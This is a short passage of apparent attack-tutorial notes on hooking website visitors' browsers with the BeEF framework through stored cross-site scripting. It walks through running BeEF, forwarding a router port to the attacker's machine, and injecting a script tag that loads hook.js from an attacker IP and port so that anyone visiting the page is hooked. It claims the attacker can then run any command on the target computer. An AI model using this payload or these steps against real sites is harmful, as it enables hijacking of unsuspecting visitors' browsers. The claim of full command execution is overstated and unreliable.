Using what we learned so far if we can execute JS on anyone 
This means we can also hook anyone who visit that page to BeEF
Then we can run any command on the target computer.

First to do that run BeFF and copy the hook url
If we are using public ip, set our public ip in the url and then go to the router page,
And set port forwarding on our private ip. The port is the number that comes after the : in the url
For example:
<script src="https://IP:PORT/hook.js"></script>

Now if anyone who will visit that page, the browser will be hooked to BeEF
